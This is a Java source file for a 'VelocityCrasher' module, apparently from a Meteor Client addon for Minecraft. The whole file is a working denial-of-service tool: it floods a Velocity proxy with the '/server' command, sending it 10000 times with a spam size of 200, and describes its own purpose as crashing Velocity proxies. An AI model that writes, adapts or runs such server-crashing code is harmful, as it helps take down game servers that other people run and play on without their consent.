package com.haykkonen.lanyard.modules.crashers.flood;

import com.haykkonen.lanyard.Lanyard;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.StringSetting;
import org.jetbrains.annotations.NotNull;

public class VelocityCrasher extends AbstractCommandFloodCrasher {

    private final Setting<String> serverName = sgGeneral.add(new StringSetting.Builder()
            .name("server-name")
            .description("The server name to connect to.")
            .defaultValue("lobby")
            .build()
    );

    public VelocityCrasher() {
        super(Lanyard.LANYARD_CRASHERS_CATEGORY, "VelocityCrasher", "Attempts to crash Velocity proxies by spamming the /server command.");
        this.amount.set(10000);
        this.spamSize.set(200);
    }

    @Override
    protected @NotNull String getCommandPayload() {
        return "/server " + serverName.get();
    }
}
